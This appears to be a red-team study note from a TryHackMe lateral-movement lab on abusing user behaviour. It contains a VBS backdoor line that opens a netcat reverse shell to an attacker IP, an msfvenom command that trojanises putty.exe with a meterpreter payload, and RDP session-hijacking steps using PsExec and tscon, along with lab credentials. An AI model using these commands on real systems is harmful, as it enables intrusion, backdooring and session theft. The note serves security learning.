---
{"dg-publish":true,"permalink":"/cards/red-team/abusing-user-behavior/"}
---

~ [[cards/red-team/lateral movement and pivoting\|lateral movement and pivoting]]
## Summary
---
**What it is:** Technique for leveraging predictable or insecure user-driven behaviors (writable shares, script execution, and abandoned RDP sessions) to gain code execution or hijack active user sessions.  

**Scope:** Covers abusing writable shared scripts/executables, backdooring user-launched resources, and hijacking disconnected RDP sessions on Windows Server ≤2016; excludes malware-specific payloads and exploit tooling syntax.  

**Key Topics:** Writable shares, user-context execution, share backdooring, VBS modification, EXE replacement, RDP session hijacking, SYSTEM privileges, lateral movement.
## How it works
---
Enterprise users routinely run scripts or binaries stored on network shares, often via desktop shortcuts. If these shares allow write access, an attacker can modify the hosted files so that each user who launches them executes attacker-controlled code locally under their own credentials.  
In parallel, Windows RDP sessions left in a disconnected state can be hijacked by anyone with SYSTEM privileges, granting full interactive access to that user’s session without requiring their password.
## Steps
---
**Attacker objective:** Execute code or gain session access under a higher-privileged user’s context by abusing predictable user behavior on {TARGET}.

### **Conceptual workflow:**

1. Identify writable network shares hosting user-launched scripts or executables.
    
2. Modify the hosted script/executable to include a hidden payload while preserving original functionality.
    
3. Wait for a user to execute the shared resource; payload runs locally under the user’s account.
    
4. For RDP hijacking:
    
    - Obtain SYSTEM on the host.
        
    - Enumerate active/disconnected RDP sessions.
        
    - Bind your session to an abandoned session to assume the user’s desktop.
        
5. Use resulting access to pivot, escalate privileges, or harvest additional credentials.
## Steps
---
An attacker can take advantage of actions performed by users to gain further access to machines in the network.
### Abusing Writeable Shares
---
It is quite common to find network shares that legitimate users use to perform day-to-day tasks when checking corporate environments. One common scenario consists of finding a shortcut to a script or executable file hosted on a network share.

![lateral movement and pivoting - 16-1.png|250](/img/user/cards/red-team/images/lateral%20movement%20and%20pivoting%20-%2016-1.png)

The idea is the administrator main an executable on a network share, and users can execute it without installing the application to each user's machine. This works if we have write permissions over such scripts or executables.

Although the script or executable is hosten on the server, when a user opens the shortcut on his workstations, the executable will be copied from the server to its `%temp%` folder and executed on the workstation. Therefore any payload will run in the context of the final user's workstation (and logged-in user account).

#### Backdooring .vbs scripts
---
If the shared resource is a VBS script, we can put a copy of nc64.exe on the same share and inject the following code in the shared script:

```shell-session
CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True
```

This will copy nc64.exe from the share to the user's workstation `%tmp%` directory and send a reverse shell back to the attacker whenever a user opens the shared VBS script.

#### Backdooring .exe Files
---
If the shared file is a Windows binary, say putty.exe, you can download it from the share and use msfvenom to inject a backdoor into it. The binary will still work as usual but execute an additional payload silently. To create a backdoored putty.exe, we can use the following command:

```shell-session
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe
```

#### RDP hijacking
---
When an administrator uses Remote Desktop to connect to a machine and closes the RDP client instead of logging off, his session will remain open on the server indefinitely. If you have SYSTEM privileges on Windows Server 2016 and earlier, you can take over any existing RDP session without requiring a password.

If we have administrator-level access, we can get SYSTEM by any method of our preference. 

1. You will be using psexec to do so. First, let's run a cmd.exe as administrator.
2. Run `PsExec64.exe -s cmd.exe` 
3. list existing session on a server: `query user`.

```C
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>administrator         rdp-tcp#6           2  Active          .  4/1/2022 4:09 AM
 luke                                    3  Disc            .  4/6/2022 6:51 AM
```

1. According to the command output above, if we were currently connected via RDP using the administrator user, our SESSIONNAME would be `rdp-tcp#6`.
2. Any session with a **Disc** state has been left open by the user and isn't being used at the moment.
3. **Active** state can be taken over but not recommended the legitimate session will be forced out.

To connect to a session, we will use tscon.exe and specify the session ID we will be taking over, as well as our current SESSIONNAME. Following the previous example, to takeover luke's session if we were connected as the administrator user, we'd use the following command:

```C
tscon 3 /dest:rdp-tcp#6
```

In simple terms, the command states that the graphical session `3` owned by luke, should be connected with the RDP session `rdp-tcp#6`, owned by the administrator user.

**Note:** Windows Server 2019 won't allow you to connect to another user's session without knowing its password.
##### Workflow
---

1. Username: t2_kelly.blake Password: 8LXuPeNHZFFG
2. These credentials will grant you administrative access to THMJMP2. 
3. Access via RDP

```C
xfreerdp /v:thmjmp2.za.tryhackme.com /u:t2_kelly.blake /p:8LXuPeNHZFFG
```

To hijack any session, in this case t1_toby.beck RDP session:

```C
query session
```

It's normal to see several users named **t1_tobey.beck** followed by a number. We can still hijack any of them, these are just identical copies of the same user:

![lateral movement and pivoting - 18.png](/img/user/cards/red-team/images/lateral%20movement%20and%20pivoting%20-%2018.png)

Then do the `tscon` command.